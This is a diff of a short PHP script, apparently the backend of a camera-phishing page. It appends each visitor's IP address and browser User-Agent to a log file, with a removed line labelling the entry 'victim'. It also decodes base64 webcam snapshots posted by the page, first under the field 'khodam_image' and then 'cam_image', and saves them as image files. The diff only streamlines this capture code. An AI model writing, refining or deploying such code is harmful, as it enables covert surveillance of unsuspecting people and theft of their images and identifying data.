@@ -1,35 +1,17 @@
 <?php
 // Simpan IP & User-Agent
-if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-} else {
-    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-}
-
-$useragent = " User-Agent: ";
-$browser = $_SERVER['HTTP_USER_AGENT'];
-
+$ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
+$useragent = "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
 $file = 'ip.txt';
-$victim = "IP: ";
-$fp = fopen($file, 'a');
-fwrite($fp, $victim);
-fwrite($fp, $ipaddress);
-fwrite($fp, $useragent);
-fwrite($fp, $browser);
-fclose($fp);
+file_put_contents($file, "IP: ".$ipaddress.$useragent, FILE_APPEND);
 
-// Simpan snapshot dari video
-if (!empty($_POST['khodam_image'])) {
+// Simpan snapshot kamera
+if (!empty($_POST['cam_image'])) {
     $date = date('dMYHis');
-    $imageData = $_POST['khodam_image'];
-    $filteredData = substr($imageData, strpos($imageData, ",")+1);
+    $imageData = $_POST['cam_image'];
+    $filteredData = substr($imageData, strpos($imageData,",")+1);
     $unencodedData = base64_decode($filteredData);
-    $fp2 = fopen('cam'.$date.'.png', 'wb');
-    fwrite($fp2, $unencodedData);
-    fclose($fp2);
+    file_put_contents('cam'.$date.'.png', $unencodedData);
 }
-
-// exit();  <-- jangan pakai exit agar HTML tetap muncul
+exit();
 ?>
